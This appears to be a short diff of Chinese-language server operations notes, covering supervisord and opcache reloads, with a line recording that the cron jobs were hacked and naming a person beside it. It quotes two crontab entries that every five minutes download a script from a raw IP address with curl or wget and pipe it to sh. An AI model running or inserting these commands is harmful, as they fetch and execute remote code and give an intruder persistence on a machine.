@@ -20,7 +20,7 @@
 - supervisord -c /etc/supervisord.conf或者supervisorctl reload重启进程管理
 
 - 开启了opcache 每次修改代码都得reload
-- 定时任务被黑的郭高伟
+- 定时任务被黑的郭高伟测试分支
 */5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
 */5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
 
